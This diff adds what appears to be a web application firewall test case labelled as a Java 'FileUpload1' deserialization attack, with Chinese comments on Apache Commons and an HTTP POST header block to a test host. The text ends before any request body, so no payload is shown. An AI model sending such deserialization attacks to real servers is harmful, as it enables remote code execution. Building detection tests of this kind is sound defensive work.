@@ -1,0 +1,11 @@
+# 反序列化-JAVA FileUpload1
+# Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。 Commons Collections包为Java标准的Collections API提供补充。
+# FileUpload 是 Apache commons下面的一个子项目,用来实现Java环境下面的文件上传功能。
+POST /?acid=80001752&bid=hd_tag_m8mv25nj HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25nj
+RM-PRO-Token: cb551446233f1e58eaa7aa2b651a3187
+RM-PRO-Time: 1742808485322
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=yRXQ4Xi8oR-UDEOAxCDxdLEUiLa5tsy_
+
